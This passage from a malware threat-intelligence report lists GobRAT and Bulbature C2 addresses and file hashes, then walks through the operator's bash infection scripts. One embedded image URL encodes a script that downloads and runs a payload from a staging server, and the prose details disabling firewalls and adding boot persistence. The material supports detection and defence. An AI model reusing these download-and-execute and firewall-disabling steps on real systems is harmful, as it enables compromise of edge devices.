GobRAT administration interface| 38.54.85.178| AS138915| Hong Kong| e4b7b3a2610ad706a83667a5bac7cd31  
GobRAT administration interface| 38.60.203.167| AS138915| Hong Kong| e4b7b3a2610ad706a83667a5bac7cd31  
GobRAT administration interface| 103.57.248.40| AS9009| Hong Kong| e4b7b3a2610ad706a83667a5bac7cd31  
GobRAT administration interface| 176.97.73.171| AS9009| Japan| e4b7b3a2610ad706a83667a5bac7cd31  
GobRAT administration interface| 38.60.203.21| AS138915| Hong Kong| e4b7b3a2610ad706a83667a5bac7cd31  
GobRAT administration interface| 38.54.85.21| AS138915| Hong Kong| e4b7b3a2610ad706a83667a5bac7cd31  
GobRAT administration interface| 38.60.203.141| AS138915| Hong Kong| e4b7b3a2610ad706a83667a5bac7cd31  
  
This table lists the Bulbature Dispenser and Bulbature C2s that have been collected in 2024.

Type| IPv4 or domain| Port  
---|---|---  
Bulbature Dispenser| eyh.ocry.com| 443  
Bulbature Dispenser| nbt201.dynamic-dns.net| 8080  
Bulbature C2| 38.180.29.229| 8245  
Bulbature C2| 38.180.128.52| 7598  
Bulbature C2| 38.60.223.208| 4557  
Bulbature C2| 139.84.230.198| 7335  
Bulbature C2| 38.180.74.173| 6114  
Bulbature C2| 45.32.33.92| 3558  
Bulbature C2| 139.84.147.229| 7860  
Bulbature C2| 64.176.56.252| 8927  
Bulbature C2| 139.84.177.244| 6542  
Bulbature C2| 139.84.163.73| 2225  
Bulbature C2| 38.180.191.118| 2814  
Bulbature C2| 38.60.212.233| 7038  
Bulbature C2| 38.180.74.14| 7144  
Bulbature C2| 45.77.34.148| 8158  
Bulbature C2| 38.54.50.163| 3296  
Bulbature C2| 139.84.170.90| 7170  
Bulbature C2| 154.205.128.210| 3591  
Bulbature C2| 139.180.139.12| 5118  
Bulbature C2| 38.60.212.167| 8764  
Bulbature C2| 5.34.176.150| 2666  
Bulbature C2| 38.180.106.167| 3973  
Bulbature C2| 154.223.21.160| 5972  
Bulbature C2| 5.34.178.144| 3652  
Bulbature C2| 38.60.203.83| 7121  
Bulbature C2| 176.97.73.215| 6894  
Bulbature C2| 38.54.50.253| 4805  
Bulbature C2| 38.180.29.5| 6214  
Bulbature C2| 38.180.188.92| 6733  
Bulbature C2| 154.90.63.156| 8080  
Bulbature C2| 64.176.228.78| 2119  
Bulbature C2| 45.76.177.40| 3053  
Bulbature C2| 139.59.43.67| 3242  
Bulbature C2| 154.90.62.247| 3472  
Bulbature C2| 154.223.21.80| 2694  
Bulbature C2| 38.180.106.179| 6648  
Bulbature C2| 154.90.62.201| 5914  
Bulbature C2| 188.116.22.59| 3632  
Bulbature C2| 154.223.21.181| 4873  
Bulbature C2| 38.60.206.78| 3314  
Bulbature C2| 154.223.20.215| 8640  
Bulbature C2| 64.176.47.133| 7216  
Bulbature C2| 38.60.196.86| 8784  
Bulbature C2| 139.84.174.102| 8835  
Bulbature C2| 64.227.130.48| 6088  
Bulbature C2| 38.180.189.108| 5984  
Bulbature C2| 38.180.106.12| 2572  
Bulbature C2| 67.219.101.151| 5989  
Bulbature C2| 158.247.223.125| 2109  
Bulbature C2| 38.60.203.61| 4516  
Bulbature C2| 139.180.200.78| 3499  
Bulbature C2| 154.90.63.215| 2280  
Bulbature C2| 38.60.212.13| 5049  
Bulbature C2| 207.148.125.75| 5893  
Bulbature C2| 108.61.127.186| 4001  
Bulbature C2| 38.180.9.2| 5226  
Bulbature C2| 141.164.47.248| 2251  
Bulbature C2| 154.223.21.16| 6259  
Bulbature C2| 66.42.34.87| 8262  
Bulbature C2| 154.205.136.160| 5366  
Bulbature C2| 91.196.70.165| 4572  
Bulbature C2| 207.148.69.74| 8225  
Bulbature C2| 139.180.212.224| 6771  
Bulbature C2| 140.82.38.225| 3748  
Bulbature C2| 139.84.227.52| 2474  
Bulbature C2| 154.205.155.3| 7497  
Bulbature C2| 38.180.74.236| 4818  
Bulbature C2| 38.54.56.45| 7507  
Bulbature C2| 38.180.74.180| 7462  
Bulbature C2| 176.97.73.199| 7422  
Bulbature C2| 104.238.176.171| 5468  
Bulbature C2| 38.54.88.248| 2882  
Bulbature C2| 64.176.49.89| 4524  
Bulbature C2| 139.84.167.48| 6004  
Bulbature C2| 139.59.80.77| 4538  
Bulbature C2| 195.80.148.142| 2410  
Bulbature C2| 154.205.128.194| 2621  
Bulbature C2| 154.205.137.248| 7192  
Bulbature C2| 68.183.89.48| 6450  
Bulbature C2| 38.180.74.228| 8976  
Bulbature C2| 45.76.154.241| 4281  
Bulbature C2| 78.141.218.239| 8717  
Bulbature C2| 38.54.50.120| 7288  
Bulbature C2| 38.54.85.244| 4986  
  
The following files were retrieved from the staging host https://38.60.221[.]145/static/, and are those described in this report. However, around 200 variations of these files were found on all the staging hosts.

Filename| Type| SHA256sum| SHA1sum| MD5sum  
---|---|---|---|---  
bulbature| Bulbature malware| 41e189a5b68f305ab6251a06475b76777bda0d035ea06cd569306ed5c98bdc98| b7328e89017b9c56e9a77150bcd9e01f023590b3| e988b0adfc9d606dba66e839394c01a0  
zone.arm| GobRAT malware| 48b243fd7ed8bc0b7ce663f0b3fc34f07fcf9fb04bf8bceaff8b7453ab4e5318| 44f2f951fdcf2b88c1f6565fae4c806019fe397c| d16a8d41950cd226240072fe1cb2b43f  
zone.x86_64| GobRAT malware| 91eaa94223c12ddc89eca5220a8c57f0254f587f73c9edc161fc161a56e2c2f0| a6ad4538b145567ded3e7df723e9777944bd3b45| fc0521c22cef4423e9fd440d1f788d4c  
zone.i686| GobRAT malware| b1c21264a60edb64895c8c61507211a829f13068541f875b615e6c1c363122ba| c049cdaf68906e280ce6e99ffe046caa13e4369f| ea9c445106d86372849b522f4aeae193  
zone.mips| GobRAT malware| 726ac8f88c4585ccb2ce2e3325726230dc7bd2c7f6667085ac2f665c4ce3fb46| b8788656c6c8bca00abb2d83672fde546ac2bf3e| 4a8462db712c05190b2741b36567fc4e  
frpc.i686| FRP (Fast Reverse Proxy)| 676cf55076127dab1403c3322d38bf72b62f8aaff25534e5af7b02fc1474a9c0| 30a3b3ffaf025d93850402de323387f1ebc5ca7a| 9e5870fc5fadd943307eecaef74bbf69  
frpc.x86_64| FRP (Fast Reverse Proxy)| a6d184715cbb596edac024089ae493785ba3c4519b493946c8f850b4bd08836c| 2a596d8db43e35951fb820588eed43872606f154| 31ced0d01855ce9b66a9fb786edc8d90  
frpc.arm| FRP (Fast Reverse Proxy)| 141bc0c7413665970cc33ba7b31f8e2ab0d1f9fb0363478aa6d3fd444e6745a4| 48a2a15803ca7784e61dccc9435786d4203ce48b| dabdabcdd97652c9175a18b3ee8847f8  
hold_by_bot.sh| Daemon script| 869a6cd8205af5ec1bf04e6abf0ff79f12e62a8eeae129b9e219e1179520bac3| 97d79325e0ffc55ff277bc24cc1f91b5c518c82c| 0c417d9d857aff511cb0d9713a511126  
zoneupdate.sh| Update script| 0858c36ed2cf29d9f7de3d7b8d595e45d888da422e76bc9c9115a8f25027d5e7| 181d629ed8faad17c5548e05fdcd48e24969a0bd| f501977e0b01d0a9c7a737ad0e197223  
zonesetup.sh| Start script| 6632fe263bf687fb8d46dd29eaf90601350681aa1930a14e2aba2a16f6c3e040| 88094c3907cb4a69bc25fe9feb1867dfbca33437| a034dd3eac327bd318b2e5f22aa24385  
zoneController.sh| Daemon script| 743e15f8cfd54077406635bea803b26c574b1b5c3862b132779a8cf52d9ef903| 8197abcad20e2d14bde93d5af0199c3ebdd9b77f| 7e5ea306574e2237dc5b3902fba2d173  
sshdeny1.sh| Block script| 1f3a0144e717e7d93fe65877b4945a25c03b0722b6761e8fc96c8b5e62be3e46| a860a33f8ec6f0f4d91a413ef3fe3b0aab45f232| f75d14bcc6d67dc7a03f734eff951b35  
zoneRestart.sh| Update script| 173e2f90de78f8288e0172e900693d228ae1071cc80a4fe02a09af6cd37358e9| b41466642674365e73428f9899a36986ced18c5d| 71b5c7a5ae58129bffadda3cc42dbcd1  
zonedelete.sh| Delete script| 667dd21bc252eb7d7415fc13ab996575bbe451062d82c94b14d6ba750d95ab64| 5e85de2e35f1fccb66cb92f7d9efc59c7cd25ac2| 855856f0d98cb3500acd524cde3f966f  
  
## **Appendi** x**: Bash scripts**

When the operator compromises an edge device, he begins by running "zonesetup.sh". This script downloads "zoneController.sh" from a staging server, modifies its permissions to make it executable, then runs it.

![](https://cdn.prod.website-files.com/69b190e7f47e4c44b0ee07d8/6a92a59c9f9b7f8b2cd14f96_6a92a25a3e6167cebbf5d8a0_6a2a7e2d3ac1f0766e415467.webp)

![](https://carbon.now.sh/?bg=rgba%28171%2C184%2C195%2C0%29&t=seti&wt=none&l=application%2Fx-sh&width=680&ds=false&dsyoff=20px&dsblur=68px&wc=true&wa=true&pv=0px&ph=0px&ln=true&fl=1&fm=Hack&fs=14px&lh=140%25&si=false&es=2x&wm=false&code=%253D%253D%253D%253D%253D%2520zonesetup.sh%2520%253D%253D%253D%253D%253D%250A%250A%2523%21%252Fbin%252Fsh%250Await%253D%2560wget%2520-q%2520-t%25201%2520-T%25208%2520--no-check-certificate%2520https%253A%252F%252F%255BREDACTED%255D%252Fstatic%252FzoneController.sh%2520-O%2520%252Ftmp%252Fmacfee%2560%250Achmod%2520%252Bx%2520%252Ftmp%252Fmacfee%250A%252Ftmp%252Fmacfee%250A)

In the meantime, "zoneController.sh" checks every 6,000 seconds to ensure that the "apached" process (corresponding to "zone.[ARCH]", GobRAT) is running, and if it is not, it downloads a script from a specified URL, modifies its permissions to make it run, then runs the script in the background. Runned in an infinite loop, this script ensures that GobRAT is run persistently.

![](https://cdn.prod.website-files.com/69b190e7f47e4c44b0ee07d8/6a92a59c9f9b7f8b2cd14f99_6a92a25c32517fc4025fa44c_6a2a7e2e3ac1f0766e415478.webp)

The operator runs the "zoneupdate.sh" script, which performs the most important infection operations on the host:

  * Installs "wget";
  * Increases the user process limit;
  * Stops and disables the firewall service;
  * Empties the firewall rules;
  * Creates a directory called "/zone";
  * Deletes several files and directories in /zone. 



The fact that the user's native configurations are modified indicates that the operator wishes to manipulate a large amount of data on this host, freeing himself from the default weak limits on edge devices.

![](https://cdn.prod.website-files.com/69b190e7f47e4c44b0ee07d8/6a92a59c9f9b7f8b2cd14f93_6a92a25de17eff730b653b71_6a2a7e2e3ac1f0766e41547b.webp)

It then downloads GobRAT malware depending on the host's system architecture, as well as Bulbature and other Bash scripts, placing them in the "/zone" directory.

![](https://cdn.prod.website-files.com/69b190e7f47e4c44b0ee07d8/6a92a59c9f9b7f8b2cd14fa8_6a92a25b693fca262e1ae9ab_6a2a7e2d3ac1f0766e41546a.webp)

Following this, it checks whether processes named "hold_by_bot.sh", "apached", "frpc.[ARCH]" and "bulbature" are running, and terminates them if they are found.

![](https://cdn.prod.website-files.com/69b190e7f47e4c44b0ee07d8/6a92a59c9f9b7f8b2cd14fab_6a92a261a49553afbaf2c80d_6a2a7e313ac1f0766e415542.webp)

After this, it:

  * Deletes several files and directories in "/zone";
  * Moves temporarily downloaded files to their final locations;
  * Changes their permissions to make them run.



![](https://cdn.prod.website-files.com/69b190e7f47e4c44b0ee07d8/6a92a59c9f9b7f8b2cd14fa2_6a92a26216f788fda8e496c3_6a2a7e313ac1f0766e415545.webp)

Finally, it:

  * Configures the "/etc/rc.local" file to run "zone/hold_by_bot.sh"
  * Empty the iptables rules at start-up
  * Adds periodic run of "/zone/sshdeny1.sh" to the crontab file
  * Increases the file and process limits in two security configuration files;
  * Runs "hold_by_bot.sh" in the background;
  * Empties the iptables rules again;
  * Stops and disables the firewalld service. 



In this way, the compromised or deployed host will be accessible without any restrictions from remote access.

![](https://cdn.prod.website-files.com/69b190e7f47e4c44b0ee07d8/6a92a59d9f9b7f8b2cd14faf_6a92a265dae089660dfc1248_6a2a7e323ac1f0766e415575.webp)

![](https://cdn.prod.website-files.com/69b190e7f47e4c44b0ee07d8/6a92a59c9f9b7f8b2cd14fa5_6a92a26016f788fda8e4962b_6a2a7e313ac1f0766e415537.webp)

Also, "zoneupdate.sh" install and run "sshdeny1.sh", which:

  * Identifies IP addresses with failed connection attempts;
  * Counts them and adds those with more than 5 failures to "/etc/hosts.deny" to block SSH access;
  * Records the date and time of the block. 



In this way, the operator reduces the chances of compromise by another actor, by blocking the possibility of brute force authentication attacks.

Whatsmore, "zonedelete.sh" and "zoneRestart.sh" can be found on a staging server open directory, but are not run by any of these bash scripts. It therefore seems that these scripts are launched by the operator itself.

![](https://cdn.prod.website-files.com/69b190e7f47e4c44b0ee07d8/6a92a59d9f9b7f8b2cd14fb2_6a92a26365cc84bc266e8deb_6a2a7e323ac1f0766e415549.webp)

The "zoneRestart.sh" script adds "hold_by_bot.sh" to the "/etc/rc.local" file so that it runs at start-up if it is not already there. It terminates GobRAT-related processes if they are running, then runs "hold_by_bot.sh" in the background.

![](https://cdn.prod.website-files.com/69b190e7f47e4c44b0ee07d8/6a92a59c9f9b7f8b2cd14f9f_6a92a264a49553afbaf2c92e_6a2a7e323ac1f0766e41554c.webp)

Finally, the "zonedelete.sh" script deletes all files and directories in the "/tmp" folder, then abruptly terminates all processes whose command line contains "tmp". However, this script does not seem to erase all traces of run of downloaded malware, since they are also in the "/zone" directory.

![](https://cdn.prod.website-files.com/69b190e7f47e4c44b0ee07d8/6a92a59c9f9b7f8b2cd14f9c_6a92a2606568d7e2b4086a85_6a2a7e313ac1f0766e415531.webp)

This concludes the analysis of the nesting of bash scripts hosted on staging servers.

Feel free to read other Sekoia.io TDR (Threat Detection & Research) analysis here :